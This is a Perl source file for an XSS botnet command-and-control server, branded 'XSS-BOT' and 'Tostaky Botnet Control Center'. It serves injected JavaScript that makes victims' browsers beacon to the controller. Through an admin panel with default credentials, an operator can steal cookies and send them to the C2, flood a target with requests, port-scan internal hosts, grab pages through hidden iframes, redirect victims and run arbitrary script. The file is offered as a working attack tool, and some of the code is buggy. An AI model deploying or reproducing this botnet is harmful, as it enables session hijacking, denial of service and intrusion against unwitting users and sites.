#!/usr/bin/perl

use IO::Socket;

# Autoflush
$| = 1;

######### Global Variables
my $VERSION = "1.0";

my %ARGS = (
				"PORT"		=> 80,				# Server listening port 
				"DEBUG"		=> 0,				# Debug mode
				"VERBOSE"	=> 0,				# Verbose mode
				"ADMIN"		=> "/admin",		# Admin URI
				"INJECT"	=> "/inject",		# Injection URI
				"SYNC"		=> "/sync",			# Sync URI
				"FATHER"	=> "",				#  Referer IP:port:sync (194.98.65.65:81:/sync)
				"LOGIN"		=> "admin",			# Admin login
				"PASSWORD"	=> "admin",			# Admin password
				"HEARTBEAT"	=> 6500,			# Bot connection timer		
				"LOADTIMER"	=> 12000,			# Page loading time
				"SESSION"	=> "sessionID",		# Session management argument
				"LOCALIP"	=> "", 				# Local IP
				"REMOTEIP"	=> "",				# Reachable IP address (useful fort NAT)
				"BOTSESSION"=> "botSessionID",	# Bot session management argument

			);			
			
my $ERROR = 0;
my $SERVER;
my %ADMIN_SESSION;
my %CLIENTS;
my %SESSIONS;
my %ADMIN_SESSION;
my @OPERATIONS;
my @AUTOACTION = ("Idle",'');
my @PEERS;
my %SERVERS;
my $SYNC_DELAY = 300;


my %HTTP_RESPONSE = (
					"200"	=> "OK",
					"404"	=> "FILE NOT FOUND",
				);
				
my %ACTIONS = (
					"Idle"		=> ["Waiting for commands",\&actionIdle],
					"Redirect"	=> ["Redirect Client",\&actionRedirect],
					"Alert"		=> ["Say Hello",\&actionAlert],
					"Custom"	=> ["Write your script",\&actionCustom],
					"Portscan"	=> ["Params: \&lt;target\&gt; \&lt;port\&gt; \[timeout\]",\&actionPortscan],
					"Flood"		=> ["Kill target. This is bad.",\&actionFlood],
					"Cookies"	=> ["Steal cookies",\&actionCookies],
					"GetPage"	=> ["Download page HTML code",\&actionGetPage],
				);

##################### Main Function Path ###########################

######### STEP 1: Get command line args and set global variables;
if(!&getCLIargs(\@ARGV)) { 
	&displayUsage();
	$ERROR = 1;
}

my %FUNCTIONS = (
					$ARGS{"ADMIN"} 		=> \&adminPage,
					$ARGS{"INJECT"}		=> \&injectPage,
					"*"			=> \&defaultPage,
				);

## Debug Mode
if($ARGS{"DEBUG"} == 1) { print "\n>> Debug mode <<\n\n";  }
if($ARGS{"DEBUG"} == 2) { print "\n>> HEAVY Debug mode <<\n\n"; use Data::Dumper; }
##

## Print banner
if($ARGS{"VERBOSE"}) {
	print "\n";
	print "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n";
	print "!!!!!    Welcome on XSS-BOT   !!!!!\n";
	print "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n";
	print "\n";
}

if($ARGS{"VERBOSE"}) {
	print "Launch Options\n";
	print "--------------\n";
	while(my($arg,$value) = each(%ARGS)) {
		if($arg ne "LOCALIP") {
			print $arg." "x(25-length($arg))."= ".$value."\n";
		}
	}
	print "\n";
}

if($ARGS{"FATHER"}) {
	my @peer = split(/:/,$ARGS{"FATHER"});
	$PEERS{$peer[0]} = \@peer;
}

######### STEP 1: End.

######### STEP 2: Sync setup

&feedInitialPeer(); 

######### STEP 2: End.

######### STEP 3: Launch Web Server
if(!$ERROR) { 
	if(!&launchWebServer()) {
		$ERROR = 1;
	}
}

######### STEP 3: End.	

######### STEP 4: Main Loop
if(!$ERROR) {
	if(!&startListener()) {
		$ERROR = 1;
	}
}
######### STEP 4: End.	


## Debug
if($ERROR && $ARGS{"DEBUG"}) { "Exiting on error. Too bad.\n"; }
##
if(!$ERROR && $ARGS{"VERBOSE"}) { "Exiting.\n"; }

##############################################################

##### STEP 1 Functions - Start ######
sub getCLIargs() {

	my ($argv_ref) = @_;

	my $error = 0;
	my $return_val = 1;
	
	if($#ARGV >= 0) { 
		foreach my $arg(@$argv_ref) {
			if(!($arg =~ /^-/)) { 
				$error = 1;
			} else {
				$arg =~ s/^--?(.*)$/$1/;
				if($arg =~ /^p(?:ort)?=(\d+)$/) { # Listening port
					$ARGS{"PORT"} = $1;
				} elsif($arg =~ /^d(?:ebug)?$/) { # Debug mode
					$ARGS{"DEBUG"} += 1;
					$ARGS{"VERBOSE"} = 1;	# Setting verbose mode as well
				} elsif($arg =~ /^v(?:erbose)?$/) { # Verbose mode
					$ARGS{"VERBOSE"} = 1;
				} elsif($arg =~ /^a(?:dmin)?=(\S+)$/) { # Admin URI
					$ARGS{"ADMIN"} = $1;
				} elsif($arg =~ /^i(?:nject)?=(\S+)$/) { #  Injection URI
					$ARGS{"INJECT"} = $1;	
				} elsif($arg =~ /^(?:y|sync)=(.*)$/) { # Sync URI
					$ARGS{"SYNC"} = $1;
				} elsif($arg =~ /^f(?:ather)?=(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d+:.*)$/) { # Referer for initial sync
					$ARGS{"FATHER"} = $1;
				} elsif($arg =~ /^l(?:ogin)?=(.*)$/) { # Admin login
					$ARGS{"LOGIN"} = $1;
				} elsif($arg =~ /^(?:w|password)=(.*)$/) { # Admin password
					$ARGS{"PASSWORD"} = $1;
				} elsif($arg =~ /^h(?:eartbeat)?=(\d+)$/) { # Bot connection timer
					$ARGS{"HEARTBEAT"} = $1;
				} elsif($arg =~ /^s(?:ession)?=([a-zA-Z0-9]+)$/) { # Session management argument
					$ARGS{"SESSION"} = $1;
				} elsif($arg =~ /^b(?:otession)?=([a-zA-Z0-9]+)$/) { # Bot session management argument
					$ARGS{"BOTSESSION"} = $1;
				} elsif($arg =~ /^r(?:emoteip)?=(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})$/) { # remotely accessible ip
					$ARGS{"REMOTEIP"} = $1;
				#} elsif($arg =~ /^(?:t|loadtimer)=(.*)$/) { # Page loading time
				#	$ARGS{"LOADTIMER"} = $1;
				} else {
					$error = 1;
				}
			}
		}
	}
	
	if($error) {
		$return_val = 0;
	}
	
	return $return_val;
	
}
##### STEP 1 Functions - END ######

##### STEP 2 Functions - START ####

sub feedInitialPeer {

	my ($father_ip,$father_port,$father_sync_uri) = split(/:/,$ARGS{"FATHER"});
	
	my $return_value = &feedPeer($father_ip,$father_port,$father_sync_uri);
	
	return $return_value;

}

sub feedPeer {

	my ($sync_ip,$sync_port,$sync_uri) = @_;
	
	my $return_value = 1;
	
	use IO::Socket;
	my $sync_sock = IO::Socket::INET->new (
								PeerAddr	=> $sync_ip,
								PeerPort 	=> $sync_port,
								Proto 		=> 'tcp',
									);
									
	if(!$sync_sock) {
		if(defined($PEERS{$sync_ip})) { # A peer is now down
			delete $PEERS{$sync_ip};
		}
		$error = 1;
	} else {
		print $syn_sock "GET ".$sync_uri." HTTP/1.0";
		my $line;
		while ($line = <$sock>) {
			chomp($line);
			if(my @peer = $line =~ /^([^:]+):([^:]+):([^:]+):([^:]+):([^:]+):([^:]+):([^:]+)/) { # @peer  =  (ip,port,sync_uri,admin_uri,inject_uri,sessionID,botSessuionID)
			$PEERS{$peer[0]} = \@peer;
			}
		}
		
		close($sync_sock);
		
	}
	
	if($error) {
		$return_value = 0;
	}
	
	return $return_value;
				
	
	
}

##### STEP 2 Functions - END ######

##### STEP 3 Functions - START ####

sub syncWithPeers {

	while(my($peer_ip,$peer_data) = each(%PEERS)) {
		&feedPeer($peer_ip,$peer_data->[1],$peer_data->[2]);
	}
		
}

sub launchWebServer {

	my $error = 0;
	my $return_value = 1;
	
	$SERVER = IO::Socket::INET->new( 
								Proto     => 'tcp',
                                LocalPort => $ARGS{"PORT"},
                                Listen    => SOMAXCONN,
                                Reuse     => 1
							);
							
	if(!$SERVER) { 
		$error = 1; 
	} else {	
		$mysockaddr = getsockname($SERVER);
		my($port, $myaddr) = sockaddr_in($mysockaddr);
		$ARGS{"LOCALIP"} = scalar gethostbyaddr($myaddr, AF_INET);	
		if(!$ARGS{"REMOTEIP"}) {
			$ARGS{"REMOTEIP"} = $ARGS{"LOCALIP"};
		}
	}
	
	## Debug
	if(!$error && $ARGS{"DEBUG"}) {	print("Server listening on ".$ARGS{"LOCALIP"}." on port ".$ARGS{"PORT"}."\n"); print("Admin URI is ".$ARGS{"ADMIN"}."\n"); }
	##
	
	if($error && $ARGS{"VERBOSE"}) {	print("Error launching server\n"); }
	
	if($error) {
		$return_value = 0;
	}
	
	return $return_value;
}

##### STEP 3 Functions - END ######

##### STEP 4 Functions - START ####

sub startListener {

	my $error = 0;
	my $return_value = 1;
	
	my $previous = time();
	
	while (my $client = $SERVER->accept()) {
	
		if(time()-$previous > $SYNC_DELAY) {
			&syncWithPeers();
			$previous = time();
		}
	
		my %client;
		$client->autoflush(1);
		$client{"request"} = <$client>;
		chomp($client{"request"});

		my $source = getpeername($client);
		my ($iport, $iaddr) = unpack_sockaddr_in($source);
		$client{"port"} = $iport;
		$client{"ip"} = inet_ntoa($iaddr);
				
		if($ARGS{"VERBOSE"}) { print($client{"ip"}." connected - Request: ".$client{"request"}."\n"); }
		
		my @request; 
		&parseRequest(\@request,\%client);
		if(defined($request[1]->[1]->{$ARGS{"SESSION"}})) { 
			$client{"session"} = $request[1]->[1]->{$ARGS{"SESSION"}};
		}
		
		## Debug (heavy)
		if($ARGS{"DEBUG"} == 2) { print "Request Array\n"; print Dumper(@request); }
		##
		
		&setClientSession(\%client);	

		## Debug (heavy)
		if($ARGS{"DEBUG"} == 2) { print "Clients Hash\n"; print Dumper(%CLIENTS); print "Sessions hash\n"; print Dumper(%SESSIONS); print "Operations Array\n"; print Dumper(@OPERATIONS); print "AutoAction Array\n"; print Dumper(@AUTOACTION);}
		##
		
		if(!defined($FUNCTIONS{$request[1]->[0]})) {
			&{$FUNCTIONS{"*"}} ($client,\%client,\@request);
		} else {
			&{$FUNCTIONS{$request[1]->[0]}} ($client,\%client,\@request);
		}
		
		close($client);
		
	}
	
	return $return_value;
	
}

sub parseRequest {

	my($line_ref,$client_ref) = @_;
	
	my $request = $client_ref->{"request"};
	
	my %arguments;
	my @uri;
	
	my($method,$uri,$protocol) = split(/ /,$request);
	my ($resource,$arguments) = split(/\?/,$uri);
	my @arguments = split(/\&/,$arguments);
	
	foreach my $arg(@arguments) {
		my($name,$value) = split(/=/,$arg);
		$arguments{$name} = $value;
	}
	
	@uri = ($resource,\%arguments);
	$line_ref->[0] = $method;
	$line_ref->[1] = \@uri;
	$line_ref->[2] = $protocol;
	
}

sub setClientSession {

	my ($client_ref) = @_;
	
	my $ip = $client_ref->{"ip"};
	my $request = $client_ref->{"request"};
	my $time = time();
	my $sessionID = $client_ref->{"session"};
	if(!$sessionID) {
		$sessionID = &getSessionID();
		$client_ref->{"session"} = $sessionID;
	}
	
	if($ARGS{"DEBUG"}) { print "Session ID : $sessionID\n"; }
	
	my @request = ($time,$request);
	
	if(!defined($CLIENTS{$ip})) {	# New client, building the full data structure
		my @requests = (\@request);		
		my @session = ($sessionID,\@requests);
		
		$CLIENTS{$ip} = \@session;
		my @action = ("Idle",'');
		$SESSIONS{$sessionID}= \@action;
	} else {						 			# Existing client
		if($CLIENTS{$ip}->[0] eq $sessionID) {	# Current session
			if($#{$CLIENTS{$ip}->[1]} >= 10) { 
				pop(@{$CLIENTS{$ip}->[1]});
			}
			unshift(@{$CLIENTS{$ip}->[1]},\@request);			
		} else {								# New session
			delete $SESSIONS{$CLIENTS{$ip}->[0]};
			my @requests = (\@request);			
			my @session = ($sessionID,\@requests);
			
			$CLIENTS{$ip} = \@session;
			my @action = ("Idle",'');
			$SESSIONS{$sessionID}= \@action;
		}
	}
}
			
##### STEP 4 Functions - END ######

##### Web Server Functions - START ##

##### Admin & Control Pages - START #####
sub adminPage {

	my ($c_socket,$client_ref,$request_ref) = @_;
	
	if($request_ref->[1]->[1]->{"login"} eq $ARGS{"LOGIN"} 						# Successful login
			&& $request_ref->[1]->[1]->{"password"} eq $ARGS{"PASSWORD"} ) { 	#
		
			# Set admin session parameters
			$ADMIN_SESSION{"sessionID"}=$client_ref->{"session"};
			$ADMIN_SESSION{"ip"}=$client_ref->{"ip"};
			$ADMIN_SESSION{"time"}=$client_ref->{"time"};
	}
		
	if($ADMIN_SESSION{"sessionID"} eq $client_ref->{"session"}
					&& $ADMIN_SESSION{"ip"} eq $client_ref->{"ip"}
					&& $ADMIN_SESSION{"time"} > ($client_ref->{"time"} - 300)) {
			
			&controlPage($c_socket,$client_ref,$request_ref);
			
	} else {
	
		my $response;
		$response .= genHeader("200","text/html");
		
		$response .= "<HTML>"."\n";
		$response .= "<HEAD></HEAD>"."\n";
		
		$response .= "<BODY>"."\n";
		$response .= "<PRE>"."\n";
		$response .= "<FORM NAME=\"login\" ACTION=\"".$ARGS{"ADMIN"}."\" METHOD=\"get\">"."\n";		
		$response .= "Login: <INPUT TYPE=\"text\" name=\"login\">"."\n";
		$response .= "Pass : <INPUT TYPE =\"password\" name=\"password\">"."\n";
		$response .= "<INPUT TYPE=\"hidden\" name=\"".$ARGS{"SESSION"}."\" value=\"".$client_ref->{"session"}."\">"."\n";
		$response .= "<INPUT TYPE=\"submit\" value=\"login\">"."\n";
		$response .= "</FORM>"."\n";
		
		$response .= "</PRE>"."\n";
		$response .= "</BODY>"."\n";
		$response .= "</HTML>\n";
		print $c_socket $response;
	
	}
}

sub controlPage {

	my ($c_socket,$client_ref,$request_ref) = @_;
	
	#### Apply selected action (if any)
	if(defined($request_ref->[1]->[1]->{"action"})
		&& defined($request_ref->[1]->[1]->{$ARGS{"BOTSESSION"}})) {
		my $action = $request_ref->[1]->[1]->{"action"};
		my $botSessionID = $request_ref->[1]->[1]->{$ARGS{"BOTSESSION"}};
		my $params;
		if(defined($request_ref->[1]->[1]->{"params"})) {
			$params = $request_ref->[1]->[1]->{"params"};
		}
		
		if(defined($ACTIONS{$action})) {
			$SESSIONS{$botSessionID}->[0] = $action;
			$SESSIONS{$botSessionID}->[1] = $params;
		}
	}
	
	#### Sets default action
	if(defined($request_ref->[1]->[1]->{"autoAction"})) {
		my $autoAction = $request_ref->[1]->[1]->{"autoAction"};		
		my $autoParams;
		if(defined($request_ref->[1]->[1]->{"autoParams"})) {
			$autoParams = $request_ref->[1]->[1]->{"autoParams"};
		}
		
		if(defined($ACTIONS{$autoAction})) {
			$AUTOACTION[0] = $autoAction;
			$AUTOACTION[1] = $autoParams;
		}
	}
	
	
	#### Display currently connected bots status
	my %bots;
	my $current_params;
	my $current_action;
	
	my $response;
	$response .= genHeader("200","text/html");

	$response .= "<HTML>"."\n";
	$response .= "<HEAD>"."\n";
	$response .= "<SCRIPT TYPE=\"text/javascript\">"."\n";
	$response .= "function changeAction(actionField) {"."\n";
	$response .= " var aTypeId;"."\n";
	$response .= " var aDescId;"."\n";
	$response .= " if(actionField == 'action') {"."\n";
	$response .= "  aTypeId = 'action';"."\n";
	$response .= "  aDescId = 'actionDesc';"."\n";
	$response .= " } else if(actionField == 'autoAction') {"."\n";
	$response .= "  aTypeId = 'autoAction';"."\n";
	$response .= "  aDescId = 'autoActionDesc';"."\n";
	$response .= " };"."\n";
	$response .= " var aValue = document.getElementById(aTypeId).value; "."\n";
	
	
	while(my($action,$details_ref) = each(%ACTIONS)) {
		my $description = $details_ref->[0];
		$response .= " if(aValue == '".$action."') {"."\n";
		$response .= "  document.getElementById(aDescId).innerHTML='".$description."';"."\n";
		$response .= " }";		
	}
	$response .= "}"."\n";	
	
	$response .= "</SCRIPT>"."\n";
	$response .= "</HEAD>"."\n";
		
	$response .= "<BODY>"."\n";
	$response .= "<PRE>"."\n";
	
	
	
	
	$response .= ">>> Tostaky Botnet Control Center <<<"."\n";

	$response .= "               <A HREF=\"".$ARGS{"ADMIN"}."?".$ARGS{"SESSION"}."=".$client_ref->{"session"}."\">refresh</A>"."\n";
	$response .= "\n";
	$response .= "\n";
	$response .= "+++ Active Sessions List +++"."\n";
	$response .= "\n";
	
	$response .= "+---- Bot IP -----+---- Action ----+---- Params ---->"."\n";
	
	while(my($ip,$session_ref) = each(%CLIENTS)) {
		## Debug (Heavy)
		if($ARGS{"DEBUG"} == 2) { print "now = ".time()." - last = ".$session_ref->[1]->[0]->[0]." - Timeout = ".((int($ARGS{"HEARTBEAT"}/1000))+1)."\n"; }
		##
		if($session_ref->[0] ne $ADMIN_SESSION{"sessionID"}
			&& $session_ref->[1]->[0]->[0] >= (time() - 2*(int($ARGS{"HEARTBEAT"}/1000)+2))) {
			
			$bots{$ip} = $CLIENTS{$ip}->[0];
			
			my $current_action = "Idle";
			my $current_params = "";
			
			if($SESSIONS{$CLIENTS{$ip}->[0]}->[0]) { 
				$current_action = $SESSIONS{$CLIENTS{$ip}->[0]}->[0];
			}		
			$response .= "| ".$ip." "x(16-length($ip));
			$response .= "| ".$current_action." "x(15-length($current_action));		
			if($SESSIONS{$CLIENTS{$ip}->[0]}->[1]) { 
				$current_params = $SESSIONS{$CLIENTS{$ip}->[0]}->[1];
			}
			my $nice_params = &URLDecode($current_params);
			$nice_params =~ s/\+/ /g;
			$response .= "| ".$nice_params;
			$response .= "\n";
			
		}
	}
	
	$response .= "+-----------------+----------------+---------------->"."\n";
	
	$response .= "\n";
	$response .= "\n";

	#### Actions
	# Automated	
	$response .= "+++++ Automated Action +++++"."\n";
	$response .= "\n";
	
	$response .= "</PRE>"."\n";
	$response .= "<FORM NAME=\"automation\" ACTION=\"".$ARGS{"ADMIN"}."\" METHOD=\"get\">"."\n";			
	$response .= "<INPUT TYPE=\"hidden\" name=\"".$ARGS{"SESSION"}."\" value=\"".$client_ref->{"session"}."\">"."\n";
	
	$response .= "<SELECT NAME=\"autoAction\" ID=\"autoAction\" onChange=\"changeAction('autoAction')\">"."\n"; 
	my $actionDescription;
	foreach my $action(keys %ACTIONS) {
		if($action eq $AUTOACTION[0]) {
			$actionDescription = $ACTIONS{$AUTOACTION[0]}->[0];
			$response .= "<OPTION VALUE=\"".$action."\" SELECTED=\"selected\">".$action."</OPTION> "."\n";
		} else { 
			$response .= "<OPTION VALUE=\"".$action."\">".$action."</OPTION> "."\n";
		}
	}
	$response .= "</SELECT>"."\n";
	
	$response .= "<INPUT TYPE=\"text\" NAME=\"autoParams\" VALUE=\"".&URLDecode($AUTOACTION[1])."\">"."\n";
	
	
	
	$response .= "<INPUT TYPE=\"submit\" value=\"Change that\">"."\n";
	$response .= "</FORM>"."\n";
	
	$response .= "<PRE>"."\n";
	$response .= "<DIV ID=\"autoActionDesc\">".$actionDescription."</DIV>"."\n";
	
	
	
	# One shot
	$response .= "+++++++ Take Control +++++++"."\n";
	$response .= "\n";
	
	$response .= "</PRE>"."\n";
	$response .= "<FORM NAME=\"control\" ACTION=\"".$ARGS{"ADMIN"}."\" METHOD=\"get\">"."\n";			
	$response .= "<INPUT TYPE=\"hidden\" name=\"".$ARGS{"SESSION"}."\" value=\"".$client_ref->{"session"}."\">"."\n";
	
	$response .= "<SELECT NAME=\"".$ARGS{"BOTSESSION"}."\">"."\n";
	while(my($bot_ip,$bot_session) = each (%bots)) {
		$response .= "<OPTION VALUE=\"".$bot_session."\">".$bot_ip."</OPTION>"."\n";
	}
	$response .= "</SELECT>"."\n";
	
	$response .= "<SELECT NAME=\"action\" ID=\"action\" onChange=\"changeAction('action')\">"."\n"; 
	my $actionCount = 0;
	my $actionDescription;
	foreach my $action(keys %ACTIONS) {
		if(!$actionCount) {
			$actionDescription = $ACTIONS{$action}->[0];
			$response .= "<OPTION VALUE=\"".$action."\" SELECTED=\"selected\">".$action."</OPTION> "."\n";
		} else { 
			$response .= "<OPTION VALUE=\"".$action."\">".$action."</OPTION> "."\n";
		}
		$actionCount++;
	}
	$response .= "</SELECT>"."\n";
	
	$response .= "<INPUT TYPE=\"text\" NAME=\"params\">"."\n";
	
	
	
	$response .= "<INPUT TYPE=\"submit\" value=\"Let\'s Go\">"."\n";
	$response .= "</FORM>"."\n";
	
	$response .= "<PRE>"."\n";
	$response .= "<DIV ID=\"actionDesc\">".$actionDescription."</DIV>"."\n";
	
	
	
	
	#### Responses
	$response .= "++++++ Bots Responses ++++++"."\n";
	$response .= "\n";
	
	foreach my $operation_ref(@OPERATIONS) {
		my @operation = @$operation_ref;
		my ($sec,$min,$hour,$mday,$mon,$year,$wday,$yday,$isdst) = localtime($operation[0]);
		
		$mon += 1;
		$mon = "0"x(2-length($mon)).$mon;
		$mday = "0"x(2-length($mday)).$mday;
		$hour = "0"x(2-length($hour)).$hour;
		$min = "0"x(2-length($min)).$min;
		$sec = "0"x(2-length($sec)).$sec;
		
		$response .= $mon."-".$mday." ".$hour.":".$min.":".$sec;
		$response .= " -> ";
		$response .= $operation[1];
		$response .= " : ";
		
		my $response_content = URLDecode($operation[2]);
		$response_content =~ s/</\&lt;/g;
		$response_content =~ s/>/\&gt;/g;
		
		$response .= $response_content;
		$response .= "\n";
	}
	
	$response .= "</PRE>"."\n";
	
	$response .= "</BODY>"."\n";
	$response .= "</HTML>\n";
	
	print $c_socket $response;
	
}

##### Admin & Control Pages - END #####

##### Injection Pages - START #######

sub injectPage {

	my ($c_socket,$client_ref,$request_ref) = @_;
	
	my $botSessionID = $client_ref->{"session"};
	
	my $response;
	$response .= &genHeader("200","text/plain");
	
	if(!$request_ref->[1]->[1]->{$ARGS{"SESSION"}}) {		# New bot session
				
		# Injecting Session Initializatin Script
		$response .= initSessionCode($botSessionID);
		$response .= &{$ACTIONS{$AUTOACTION[0]}->[1]}($AUTOACTION[1]);
		$SESSIONS{$botSessionID}->[0] = $AUTOACTION[0];
		$SESSIONS{$botSessionID}->[1] = $AUTOACTION[1];
		
	} else {
		
		if(defined($ACTIONS{$SESSIONS{$botSessionID}->[0]}) && $SESSIONS{$botSessionID}->[0] ne "Idle") {
			$response .= &{$ACTIONS{$SESSIONS{$botSessionID}->[0]}->[1]}($SESSIONS{$botSessionID}->[1]);
		}
		
		if(defined($request_ref->[1]->[1]->{"return"})) {
			my @operation = (time(),$client_ref->{"ip"},$request_ref->[1]->[1]->{"return"});
			unshift(@OPERATIONS,\@operation);
		}
		
	}
					
	print $c_socket $response;
	
	if(defined($ACTIONS{$SESSIONS{$botSessionID}->[0]}) && 
		( $SESSIONS{$botSessionID}->[0] eq "Custom"
			|| $SESSIONS{$botSessionID}->[0] eq "Alert"
			|| $SESSIONS{$botSessionID}->[0] eq "Portscan"
			|| $SESSIONS{$botSessionID}->[0] eq "GetPage")
			) {
		$SESSIONS{$botSessionID}->[0] = "Idle";
		$SESSIONS{$botSessionID}->[1] = '';
	}
	
}

##### Injection Pages - END #########



##### Injection Scripts - START #######

sub initSessionCode {

	my ($sessionID) = @_;
	
	my $script_code;
	
	$script_code .= "function connectCC(retval) {"."\n";
	$script_code .= " var URL= 'http://".$ARGS{"REMOTEIP"}.":".$ARGS{"PORT"}.$ARGS{"INJECT"}."?".$ARGS{"SESSION"}."=".$sessionID."';"."\n";
	$script_code .= " if(retval) { URL = URL+'\&return='+retval; } "."\n";
	$script_code .= " var scriptTag = document.getElementById('loadScript');"."\n";
    $script_code .= " var head = document.getElementsByTagName('head').item(0);"."\n";  
    $script_code .= " if(scriptTag) head.removeChild(scriptTag);"."\n";  
    $script_code .= " script = document.createElement('script');"."\n";
    $script_code .= " script.src = URL;"."\n";
    $script_code .= " script.type = 'text/javascript';"."\n";
    $script_code .= " script.id = 'loadScript';"."\n";
    $script_code .= " head.appendChild(script);"."\n";
	$script_code .= "}"."\n";	
	$script_code .= "var sessionID='".$sessionID."';"."\n";
	$script_code .= "setInterval('connectCC()',".$ARGS{"HEARTBEAT"}.");"."\n";
	
	
	return $script_code;
	
}
	
sub actionRedirect {

	my ($params) = @_;
	
	my $code;
	
	$code .= "var returnValue = window.location='".&URLDecode($params)."';\n";
	
	return $code;
	
}	

sub actionAlert {

	my ($params) = @_;
	
	my $code;
	
	$code .= "var returnValue = alert('".$params."');\n";
	
	return $code;
	
}	

sub actionCustom {

	my ($params) = @_;
	
	my $code;
	
	$code .= "var returnValue = ".&URLDecode($params).";\n";
	$code .= "connectCC(returnValue);"."\n";
	
	return $code;
	
}	

sub actionPortscan {

	my ($params) = @_;
	my ($target,$port,$timeout) = split(/\+/,$params);
	
	if(!$timeout) { $timeout = 100; }
	
	my $code;
		
	$code .= "var img = new Image();"."\n";
	$code .= "var open = 0;"."\n";
	$code .= "img.onerror = function () { open = 1; };"."\n";	
	$code .= "img.onload = img.onerror;"."\n";
	$code .= "img.src = 'http://' + '".$target."' + ':' + '".$port."';"."\n";
	$code .= "setTimeout(function () {"."\n";
	$code .= " if (open) { connectCC(\'".$target."/".$port.":open\'); }"."\n";	
	$code .= " else { connectCC(\'".$target."/".$port.":closed\'); }"."\n";
	$code .= "}, ".$timeout.");"."\n";		
	
	return $code;
	
};

sub actionFlood {

	my ($params) = @_;
	
	my $code;
	
	$code .= "function flood() {"."\n";
	$code .= " var img = new Image();"."\n";
	$code .= " img.src = '".&URLDecode($params)."';"."\n";
	$code .= " img.onload;"."\n";
	$code .= "}"."\n";
	$code .= "var floodInterval = setInterval('flood()',50);"."\n";
	$code .= "setTimeout(function() { clearInterval(floodInterval); },".($ARGS{"HEARTBEAT"}-500).");"."\n";
	
	return $code;
	
}

sub actionCookies {

	my ($params) = @_;
	
	my $code;
	
	$code .= "var returnValue = document.cookie,".";\n";
	$code .= "connectCC(returnValue);"."\n";
	
	return $code;
	
}

sub actionIdle {

	my ($params) = @_;
	
	;
	
}

## ABORTED. For now...
#

sub actionGetPage {

	my ($params) = @_;
	
	my $code;
	
	$code .= "function sendContent() {"."\n";
	$code .= " var targetContent = window.frames['grabFrame'].document.body.innerHTML;"."\n";
	$code .= " connectCC(targetContent);"."\n";
	$code .= "}"."\n";	
	$code .= "var iframeTag = document.getElementById('grabFrame');"."\n";	
    $code .= "if(iframeTag) { document.body.removeChild(iframeTag); }"."\n";  
	$code .= "var iframeObj = document.createElement('IFRAME');"."\n";
    $code .= "iframeObj.src = '".&URLDecode($params)."';"."\n";	
    $code .= "iframeObj.name = 'grabFrame';"."\n";
    $code .= "iframeObj.id = 'grabFrame';"."\n";
	$code .= "iframeObj.height=0;"."\n";
	$code .= "iframeObj.width=0;"."\n";
	$code .= "document.body.appendChild(iframeObj);"."\n";	
	$code .= "var targetContent = window.frames['grabFrame'].document.body.innerHTML;"."\n";
	$code .= "if(targetContent == null) {"."\n";
	$code .= "  targetContent = document.getElementById('grabFrame').contentDocument.body.innerHTML;"."\n";
	$code .= "}"."\n";
	
	#$code .= "alert(targetContent);"."\n";
	#$code .= " connectCC(targetContent);"."\n";
	$code .= "setTimeout(\"connectCC(targetContent)\",".$ARGS{"LOADTIMER"}.");"."\n";		
	#$code .= "setTimeout(\"alert(targetContent)\",".$ARGS{"LOADTIMER"}.");"."\n";	

	;
	
}

#
## But I will be back...

##### Injection Scripts - END #########

##### Default Page #####
sub defaultPage {

	my ($c_socket,$client_ref,$request_ref) = @_;
	
	my $response;
	$response .= genHeader("200","text/html");
	$response .= "\n";
	$response .= "<HTML><HEAD></HEAD><BODY>You should probably not be here...</BODY></HTML>\n";
	print $c_socket $response;


}



sub genHeader {

	my ($response_code,$response_type) = @_;
	
	my $response_text = $HTTP_RESPONSE{$response_code};
	
	my $header;
	
	$header = "HTTP/1.1 $response_code $response_text\n";
	$header .= "Content-Type: $response_type\n";
	$header .= "Cache-control: no-cache\n";
	$header .= "\n";
	
	return $header;
	
}



	


##### Generic Functions - START ####

sub displayUsage {

	print "Looser...\n";
	
}

sub getSessionID {

	my $sessionIDlength = 10;
	my @values = (0 .. 9,A .. Z);
	my $sessionID;
	for(my $i=0; $i<= $sessionIDlength; $i++) {
		$sessionID .= $values[int(rand(36))];
	}
	
	return $sessionID;
	
}

sub URLDecode {

    my ($url) = @_;
	
    $url =~ s/%([a-fA-F0-9]{2})/chr(hex($1))/eg;
	
    return $url;
}

sub buildURI {

	my ($req_ref) = @_;
	
	my $uri;
	my $resource = $req_ref->[1]->[0];
	my $arguments;
	my $arguments_ref = $req_ref->[1]->[1];
	
	while(my($arg,$value) = each(%$arguments_ref)) {
		$arguments .= "\&".$arg."=".$value;
	}
	$arguments =~ s/^&//;
	
	$uri = $resource."?".$arguments;
	
	return $uri;
	
}
					
##### Generic Functions - END ######	